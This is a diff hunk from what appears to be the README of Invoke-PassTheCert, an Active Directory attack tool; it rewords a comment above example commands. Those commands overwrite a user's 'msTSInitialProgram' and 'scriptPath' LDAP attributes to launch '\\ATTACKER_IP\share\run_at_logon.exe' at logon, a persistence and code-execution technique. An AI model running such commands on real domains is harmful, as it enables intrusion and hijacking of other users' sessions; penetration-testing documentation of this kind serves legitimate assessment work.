@@ -50,7 +50,7 @@ $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP'
 # List all the available actions
 Invoke-PassTheCert -a -NoBanner
 
-# Overwrite the 'msTSInitialProgram' and 'scriptPath' attributes's values of 'John JD. DOE' user to '\\ATTACKER_IP\share\run_at_logon.exe'
+# Overwrite the values of the 'msTSInitialProgram' and 'scriptPath' attributes for 'John JD. DOE' user to '\\ATTACKER_IP\share\run_at_logon.exe'
 Invoke-PassTheCert -Action 'OverwriteValueInAttribute' -LdapConnection $LdapConnection -Object 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'msTSInitialProgram' -Value '\\ATTACKER_IP\share\run_at_logon.exe'
 Invoke-PassTheCert -Action 'OverwriteValueInAttribute' -LdapConnection $LdapConnection -Object 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'scriptPath' -Value '\\ATTACKER_IP\share\run_at_logon.exe'
 ```
